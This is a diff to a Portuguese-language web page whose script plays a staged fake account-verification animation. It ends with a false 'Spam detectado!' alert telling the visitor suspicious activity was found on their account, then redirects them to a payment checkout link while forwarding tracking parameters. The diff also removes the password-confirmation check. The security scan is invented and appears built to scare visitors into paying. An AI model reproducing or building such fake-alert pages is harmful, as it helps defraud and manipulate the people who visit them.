@@ -388,7 +388,7 @@
                     </label>
                 </div>
 
-                <button type="button" class="submit-button" id="submitBtn" onclick="window.location.href='https://www.pagamentos-seguro.link/checkout/03d049da-496d-4596-acfa-50e93155404b'">
+                <button type="button" class="submit-button" id="submitBtn">
   Acessar conteúdo
 </button>
             </form>
@@ -418,70 +418,66 @@
     </footer>
 
     <script>
-        // CONFIGURE AQUI O LINK DE REDIRECIONAMENTO
-        const REDIRECT_URL = 'https://www.pagamentos-seguro.link/checkout/03d049da-496d-4596-acfa-50e93155404b'; // ← SUBSTITUA PELO SEU LINK
+    // CONFIGURE AQUI O LINK DE REDIRECIONAMENTO
+    const REDIRECT_URL = 'https://www.pagamentos-seguro.link/checkout/03d049da-496d-4596-acfa-50e93155404b';
 
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            
-            // Validação das senhas
-            const password = document.getElementById('password').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
-            
-            if (password !== confirmPassword) {
-                alert('As senhas não coincidem. Por favor, verifique.');
-                return;
+    // Captura utm_source da URL atual e monta o link final com o parâmetro
+    function buildRedirectUrl() {
+        const params = new URLSearchParams(window.location.search);
+        const utmSource = params.get('utm_source');
+        if (utmSource) {
+            const redirectParams = new URLSearchParams({ utm_source: utmSource });
+            return REDIRECT_URL + '?' + redirectParams.toString();
+        }
+        return REDIRECT_URL;
+    }
+
+    document.getElementById('submitBtn').addEventListener('click', function() {
+
+        document.getElementById('loadingScreen').classList.add('active');
+        
+        let progress = 0;
+        let phase = 1;
+        
+        const interval = setInterval(() => {
+            if (phase === 1) {
+                progress += 2;
+                if (progress >= 30) {
+                    phase = 2;
+                    document.getElementById('loadingText').textContent = 'Carregando seus dados...';
+                    document.getElementById('loadingSubtext').textContent = 'Verificando informações da conta';
+                }
+            }
+            else if (phase === 2) {
+                progress += 2;
+                if (progress >= 60) {
+                    phase = 3;
+                    document.getElementById('loadingText').textContent = 'Verificação de segurança...';
+                    document.getElementById('loadingSubtext').textContent = 'Analisando atividades suspeitas';
+                }
+            }
+            else if (phase === 3) {
+                progress += 1.5;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    document.getElementById('progressBar').style.background = 'linear-gradient(90deg, #ff3b30 0%, #ff453a 100%)';
+                    document.getElementById('loadingText').textContent = 'Atenção: Spam detectado!';
+                    document.getElementById('loadingText').classList.add('error');
+                    document.getElementById('loadingSubtext').textContent = 'Foi identificado atividade suspeita de spam na sua conta';
+                    document.getElementById('loadingSubtext').classList.add('error');
+                    document.getElementById('errorIcon').classList.add('show');
+                    
+                    // Redireciona com utm_source preservado
+                    setTimeout(() => {
+                        window.location.href = buildRedirectUrl();
+                    }, 2500);
+                }
             }
             
-            // Mostra a tela de loading
-            document.getElementById('loadingScreen').classList.add('active');
-            
-            // Animação da barra de progresso
-            let progress = 0;
-            let phase = 1;
-            
-            const interval = setInterval(() => {
-                // Fase 1: Criando conta (0-30%)
-                if (phase === 1) {
-                    progress += 2;
-                    if (progress >= 30) {
-                        phase = 2;
-                        document.getElementById('loadingText').textContent = 'Carregando seus dados...';
-                        document.getElementById('loadingSubtext').textContent = 'Verificando informações da conta';
-                    }
-                }
-                // Fase 2: Carregando dados (30-60%)
-                else if (phase === 2) {
-                    progress += 2;
-                    if (progress >= 60) {
-                        phase = 3;
-                        document.getElementById('loadingText').textContent = 'Verificação de segurança...';
-                        document.getElementById('loadingSubtext').textContent = 'Analisando atividades suspeitas';
-                    }
-                }
-                // Fase 3: Verificação (60-100%)
-                else if (phase === 3) {
-                    progress += 1.5;
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        
-                        // Mostra erro
-                        document.getElementById('progressBar').style.background = 'linear-gradient(90deg, #ff3b30 0%, #ff453a 100%)';
-                        document.getElementById('loadingText').textContent = 'Atenção: Spam detectado!';
-                        document.getElementById('loadingText').classList.add('error');
-                        document.getElementById('loadingSubtext').textContent = 'Foi identificado atividade suspeita de spam na sua conta';
-                        document.getElementById('loadingSubtext').classList.add('error');
-                        document.getElementById('errorIcon').classList.add('show');
-                        
-                        // Redireciona após 2.5 segundos
-                        setTimeout(() => {
-                            window.location.href = REDIRECT_URL;
-                        }, 2500);
-                    }
-                }
-                
-                document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
-            }, 50);
-        });
-    </script>
+            document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
+        }, 50);
+    });
+</script>
 </body>
 </html>
